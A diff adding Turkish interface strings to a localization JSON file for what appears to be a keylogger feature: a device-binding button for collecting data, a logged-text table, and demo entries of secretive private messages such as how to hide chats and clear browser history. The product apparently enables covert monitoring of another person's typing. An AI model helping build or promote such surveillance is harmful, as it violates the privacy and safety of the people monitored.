@@ -826,5 +826,37 @@
       "title": "Konum Haritası",
       "selected_location": "Seçilen Konum"
     }
+  },
+  "dkl": {
+    "header": {
+      "title": "Tuş Kaydedici",
+      "demo_message": "Demo verileri. Gerçek verileri toplamak için cihazınızı bağlayın.",
+      "bind_button": "Cihazımı bağla",
+      "bind_button_aria": "Veri toplamaya başlamak için cihazı bağla"
+    },
+    "dropdown": {
+      "label": "Uygulamalar"
+    },
+    "table": {
+      "app_name": "Uygulama Adı",
+      "logged_text": "Kaydedilen Metin",
+      "time": "Zaman",
+      "no_activity": "Son etkinlik yok"
+    },
+    "pagination": {
+      "prev_button_aria": "Önceki sayfa",
+      "next_button_aria": "Sonraki sayfa"
+    },
+    "logs": [
+      { "text": "Telefonda mesajlar nasıl gizlenir?" },
+      { "text": "Bu akşam buluşalım, kimseye söyleme." },
+      { "text": "Onlara geç saate kadar çalıştığımı söyledim." },
+      { "text": "Sohbet geçmişi nasıl silinir?" },
+      { "text": "Yarın beni koruyabilir misin?" },
+      { "text": "Her zamanki yerde buluşalım." },
+      { "text": "Bunu öğrenmelerine izin veremem." },
+      { "text": "Bunu okuduktan sonra sil." },
+      { "text": "Tarayıcı geçmişi nasıl temizlenir?" }
+    ]
   }
 }
